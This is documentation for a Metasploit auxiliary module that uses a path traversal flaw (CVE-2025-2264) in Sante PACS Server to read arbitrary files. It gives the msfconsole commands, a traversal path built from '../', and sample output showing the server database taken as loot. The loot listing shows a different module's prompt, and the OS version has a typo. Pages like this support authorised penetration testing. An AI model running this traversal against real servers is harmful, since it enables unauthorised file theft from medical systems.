## Vulnerable Application

This module exploits a path traversal vulnerability in Sante PACS Server <= v4.1.0 (CVE-2025-2264) to read arbitrary files from the system.

## Testing

The software can be obtained from
[the vendor](https://www.santesoft.com/win/sante-pacs-server/download.html).

By default, the server listens on TCP port 3000 on all network interfaces.

**Successfully tested on**

- Sante PACS Server v4.1.0 on Windows 22H2

## Verification Steps

1. Install and run the application
2. Start `msfconsole` and run the following commands:

```
msf6 > use auxiliary/gather/pacsserver_traversal
msf6 auxiliary(gather/pacsserver_traversal) > set RHOSTS <IP>
msf6 auxiliary(gather/pacsserver_traversal) > run
```

This should return the database for the web server. Any files retrieved will
be stored as loot.

## Options

### FILE
The file to be retrieved from the file system. By default, this is the database for the web server, HTTP.db. However, any arbitrary
file can be specified.

Example: /.HTTP/HTTP.db

### DEPTH
The traversal depth. The FILE path will be prepended with /assets/ + ../ * DEPTH.

## Scenarios

Running the exploit against v4.1.0 on Windows 22H22 should result in an output similar to the following:

```
msf6 auxiliary(gather/pacsserver_traversal) > run
[*] Running module against 192.168.137.217

[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[+] File retrieved: /assets/../../.HTTP/HTTP.db
[*] File saved as loot.
[*] Auxiliary module execution completed

```

The file will be stored as loot:

```
msf6 auxiliary(gather/upsmon_traversal) > loot

Loot
====

host             service  type                         name                                 content     info                                               path
----             -------  ----                         ----                                 -------     ----                                               ----
192.168.137.217           pacsserver.file              /.HTTP/HTTP.db                       text/plain  File retrieved through PACS Server path traversal.  /home/foo/.msf4/loot/20250502165539_default_192.168.137.217_pacsserver.file_594385.txt
```
